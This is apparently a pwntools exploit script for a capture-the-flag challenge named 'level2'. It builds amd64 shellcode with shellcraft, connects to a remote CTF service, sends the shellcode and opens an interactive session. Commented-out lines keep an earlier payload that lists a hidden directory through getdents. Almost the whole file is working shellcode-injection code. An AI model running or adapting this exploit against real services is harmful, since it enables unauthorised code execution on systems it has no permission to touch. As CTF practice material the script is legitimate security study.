from pwn import *

context.arch = 'amd64'
binary = context.binary = ELF('./level2')
# gHyy8peRmmIU0yVAeiPq96VmhE6W7JkM
# payload = shellcraft.open('/gHyy8peRmmIU0yVAeiPq96VmhE6W7JkM', oflag=constants.O_DIRECTORY)
# payload += shellcraft.getdents('rax', 'rsp', 1048)
# payload += shellcraft.write(1, 'rsp', 'rax')
# payload += shellcraft.exit(0)

payload = shellcraft.mmap(0, 0x1000, 0, -1, 0)
payload += shellcraft.write(1, 'rdx', 'rax')
payload += shellcraft.exit(0)

print(payload)
payload = asm(payload)

p = remote('nc.ctf.unitedctf.ca', 6004)
print(payload)
print(p.recvuntil(b'> '))
info('sending payload')
p.sendline(payload)

print(p.recvall())
p.interactive()
